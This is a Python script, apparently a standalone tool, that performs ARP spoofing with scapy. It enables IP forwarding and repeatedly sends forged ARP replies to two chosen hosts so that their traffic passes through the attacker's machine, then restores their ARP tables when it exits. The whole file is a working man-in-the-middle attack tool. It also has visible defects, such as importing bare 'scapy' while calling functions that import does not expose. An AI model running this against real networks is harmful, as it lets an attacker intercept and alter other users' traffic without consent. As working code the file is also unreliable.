#!/usr/bin/python3
try:    
    print("[>] Importing required modules")
    import scapy  # type: ignore
    import time
    import argparse
    import re
    import subprocess
    import logging
    
except ModuleNotFoundError:
    print("[!] Missing modules, Exiting...")
    exit()
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


def is_root():
    """Check whether the script was run as root or not"""
    try:
        current_user_id = int(subprocess.check_output(["id", "-u"]))
        if current_user_id == 0:
            return True
        else:
            logger.error("Please run the script as root")
            return False
    except subprocess.CalledProcessError as e:
        logger.error(f"Failed to get user ID: {e}")
        return False

def get_arguments():
    """Get arguments from the command line"""
    parser = argparse.ArgumentParser(description="ARP spoofing script")
    parser.add_argument("-t", "--targets", dest='target', help="2 targets to perform the spoof", nargs=2)
    parser.add_argument("-s", "--silent", dest="mute", help="Show less output", action="store_true")
    options = parser.parse_args()

    return options.target, options.mute

def ip_is_valid(ip):
    """Check whether IP is valid"""
    pattern = re.compile(r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
    return bool(pattern.match(ip))

def get_mac(ip):
    """Get the MAC address of the IP by ARP request"""
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_broadcast_packet = broadcast_packet / arp_packet
    answered = scapy.srp(arp_broadcast_packet, timeout=5, verbose=False)[0]
    if answered:
        return answered[0][1].hwsrc
    else:
        return None

def enable_ip_forwarding():
    """Enable IP forwarding"""
    logger.info("Enabling IP Forwarding")
    with open("/proc/sys/net/ipv4/ip_forward", "w") as ip_forward_file:
        ip_forward_file.write("1\n")

def spoof(target_ip, spoof_ip, target_mac):
    """Create ARP response packet for the target MAC"""
    arp_spoof_response = scapy.ARP(op=2, hwdst=target_mac, psrc=spoof_ip, pdst=target_ip)  # Crafting the packet
    scapy.send(arp_spoof_response, verbose=False)  # Sending the modified ARP response

def restore(targeted_ip, spoofed_ip, targetted_mac, spoofed_mac):
    """Restore ARP tables"""
    arp_honest_response = scapy.ARP(op=2, psrc=spoofed_ip, pdst=targeted_ip, hwsrc=spoofed_mac, hwdst=targetted_mac)
    scapy.send(arp_honest_response, verbose=False, count=4)  # Sending the honest response 4 times

def main():
    # To keep track of sent packets
    sent_packets_count = 0

    # Parsing the arguments
    targets, mute = get_arguments()

    # Checking for sufficient privileges
    if not is_root():
        exit()

    # Checking the provided arguments
    try:
        ip_1, ip_2 = targets
    except TypeError:
        logger.error("Targets not passed by command-line arguments (properly), inputting manually")
        ip_1 = input("[?] Enter the IP 1 : ")
        ip_2 = input("[?] Enter the IP 2 : ")
        print()  # Just a line break

    # Checking either the IP's are valid or not
    logger.info("Validating the IP's")
    if ip_is_valid(ip_1) and ip_is_valid(ip_2):
        logger.info("IP's are valid, Proceeding")
    else:
        logger.error("IP's are not valid, Exiting...")
        exit()

    # Enabling IP forwarding because we don't want to block the responses
    enable_ip_forwarding()

    # Starting the spoof
    logger.info("Starting the spoof")

    # Getting the mac address
    mac_1 = get_mac(ip_1)
    mac_2 = get_mac(ip_2)

    # Sending the spoofed responses
    try:
        while True:
            spoof(ip_1, ip_2, mac_1)
            spoof(ip_2, ip_1, mac_2)
            sent_packets_count += 1
            print(f"\r[+] {sent_packets_count} spoof packet pair sent to both IP's", end='')
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n\n[+] Restoring ARP tables...")
        restore(ip_1, ip_2, mac_1, mac_2)
        restore(ip_2, ip_1, mac_2, mac_1)
        print("[+] Exiting...")
        exit()
    except Exception as e:
        print("\n[X] Something went wrong :", e)
        exit()
    finally:
        print("\n[+] Restoring ARP tables...")
        restore(ip_1, ip_2, mac_1, mac_2)
        restore(ip_2, ip_1, mac_2, mac_1)
        print("[+] Exiting...")

if __name__ == "__main__":
    main()
